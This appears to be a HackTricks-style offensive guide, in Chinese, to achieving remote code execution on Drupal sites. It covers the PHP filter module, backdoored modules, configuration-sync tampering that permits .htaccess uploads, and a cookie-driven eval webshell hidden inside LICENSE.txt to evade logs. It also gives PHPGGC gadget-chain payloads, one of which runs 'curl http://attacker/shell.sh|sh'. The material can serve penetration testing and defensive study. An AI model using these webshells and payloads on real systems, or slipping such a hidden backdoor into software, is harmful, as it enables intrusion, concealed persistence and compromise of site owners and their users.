# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## With PHP Filter Module

> [!WARNING]
> 在旧版本的 Drupal **(在版本 8 之前)**，可以以管理员身份登录并**启用 `PHP filter` 模块**，该模块会 "Allows embedded PHP code/snippets to be evaluated."。但从版本 8 起该模块默认不再安装。

1. 访问 **/modules/php**，如果返回 403 错误则 **PHP filter plugin 已安装，可以继续**
1. 如果没有，转到 `Modules`，勾选 `PHP Filter` 的复选框，然后点击 `Save configuration`
2. 然后，要利用它，点击 `Add content`，选择 `Basic Page` 或 `Article` 并编写 **PHP backdoor**，然后在 Text format 中选择 `PHP` 代码，最后选择 `Preview`
3. 要触发它，只需访问新创建的 node:
```bash
curl http://drupal.local/node/3
```
## 安装 PHP Filter 模块

> [!WARNING]
> 在当前版本中，默认安装后仅通过网页访问已无法再安装插件。

从版本 **8 起，** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **模块默认未安装**。要利用此功能，我们必须**自行安装该模块**。

1. 从 Drupal 网站下载该模块的最新版本。
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. 下载完成后，转到 **`Administration`** > **`Reports`** > **`Available updates`**。
3. 点击 **`Browse`**，选择我们下载到的目录中的文件，然后点击 **`Install`**。
4. 模块安装后，我们可以点击 **`Content`** 并**创建一个新的基本页面**，类似于我们在 Drupal 7 示例中所做的。再次确保从 **`Text format`** 下拉中**选择 `PHP code`**。

## Backdoored Module

> [!WARNING]
> 在当前版本中，默认安装后仅通过网页访问已无法再安装插件。

过去可以**下载**一个**模块**，向其中添加一个**backdoor**，然后**安装**它。例如，下载 [**Trurnstile**](https://www.drupal.org/project/turnstile) 模块的压缩包，在其中创建一个新的 PHP backdoor 文件，并通过 `.htaccess` 文件允许访问该 PHP 文件：
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
然后前往 **`http://drupal.local/admin/modules/install`** 安装带后门的模块，并访问 **`/modules/turnstile/back.php`** 来执行它。

## 通过 Configuration synchronization 对 Drupal 进行后门植入 <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### 第 1 部分（激活 _Media_ 和 _Media Library_）

在 _Extend_ 菜单 (/admin/modules) 中，您可以激活看起来已安装的插件。默认情况下，插件 _Media_ 和 _Media Library_ 未被激活，因此我们将激活它们。

激活前：

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

激活后：

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 第 2 部分（利用 _Configuration synchronization_ 功能） <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

我们将利用 _Configuration synchronization_ 功能来导出（export）和上传（import）Drupal 配置条目：

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**修补 system.file.yml**

让我们从修补第一个条目 `allow_insecure_uploads` 开始，从：

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

到:

文件: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**修补 field.field.media.document.field_media_document.yml**

然后，将第二个条目 `file_extensions` 从：

文件: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

到：

文件： field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> 我在这篇博客文章中没有使用它，但值得注意的是可以以任意方式定义条目 `file_directory`，并且它易受 path traversal attack（因此我们可以在 Drupal 文件系统树中向上返回）。

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 第3部分（利用功能 _Add Document_） <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

最后一步是最简单的，分为两个子步骤。第一步是上传一个 .htaccess 格式的文件，利用 Apache 指令使 .txt 文件能够被 PHP 引擎解释。第二步是上传一个包含我们 payload 的 .txt 文件。

文件: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
为什么这个技巧很酷？

因为一旦 Webshell（我们称之为 LICENSE.txt）被放置到 Web 服务器上，我们可以通过 `$_COOKIE` 传输我们的命令，在 Web 服务器日志中这会显示为对一个文本文件的合法 GET 请求。

为什么把我们的 Webshell 命名为 LICENSE.txt？

原因很简单，例如如果我们取用以下文件 [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)（该文件已存在于 Drupal core 中），该文件有 339 行，大小为 17.6 KB，足够大，适合在中间添加一小段 PHP 代码（因为文件足够大）。

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

文件：Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **第3.1部分（上传文件 .htaccess）**

首先，我们利用 _Add Document_ (/media/add/document) 功能上传包含 Apache 指令的文件（.htaccess）。

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**第3.2部分（上传文件 LICENSE.txt）**

然后，我们再次利用 _Add Document_ (/media/add/document) 功能上传一个隐藏在许可文件中的 Webshell。

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### 第4部分（与 Webshell 交互） <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

最后一部分是与 Webshell 进行交互。

如下面的截图所示，如果我们的 Webshell 所期望的 cookie 未定义，通过 Web 浏览器访问该文件时会得到如下结果。

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

当攻击者设置了该 cookie 后，就可以与 Webshell 交互并执行任意命令。

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

正如你在日志中看到的，看起来只是请求了一个 txt 文件。

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

感谢你花时间阅读这篇文章，希望它能帮助你获得一些 shells。

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

两份通告于 **20 Nov 2024** 发布（CVE-2024-55637 & CVE-2024-55638），描述了 Drupal core 中新的 PHP object gadget chains（7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, 早期 11.x）。它们**并不能直接被利用**，但一旦任何 contrib/module 对用户输入执行 `unserialize()`，就为攻击者提供了现成的链。

实用的利用工作流程：

1. **查找 unserialize sink**（contrib module 或自定义代码）。在代码库中 grep `unserialize(` 或 `Drupal\Component\Serialization\PhpSerialize::decode`。针对接受 POST/JSON 或配置导入的端点。
2. **生成 payload**，使用与 gadget chain 匹配的易受攻击类路径。在 SA-CORE-2024-008 之后，公共链已被加入常见的 payload 生成器。以 PHPGGC（commit ≥ Dec 2024）为例：
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. 将 **Deliver the serialized blob** 发送到 sink (e.g., parameter that gets deserialized). 对于 form-encoded body:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Trigger destruction**（通常在请求结束时自动触发）并执行该命令。

测试注意事项：

- Gadget 仅适用于 **早于 10.2.11 / 10.3.9 / 7.102** 的版本（已修补）。通过 `/core/lib/Drupal.php` 或 `CHANGELOG.txt` 验证目标版本。
- 第三方 DB 驱动可能需要额外加固；查找那些错过安全更新窗口的部署。

## 最近的 contrib-module unsafe deserialization → RCE

一些 contrib 模块在 2024 年末修复了不安全的 `unserialize()` 路径。如果站点缺少这些更新，它们会为 core gadget chain 提供可利用的 sink：

- **Mailjet** (<4.0.1, CVE-2024-13296)：管理员可控的数据被传递到 `unserialize()`，在与 core gadgets 链接时可导致 **PHP Object Injection → RCE**。
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297)：类似的不安全 `unserialize()` 用法，可由拥有 `access administration pages` 权限的用户触及。

测试思路（已认证）：
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
如果该模块反序列化上传的数据，gadget chain 会导致 RCE。将其与 XSS/CSRF 结合以窃取 admin cookies，从而形成完整的攻击链。

## 参考资料

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
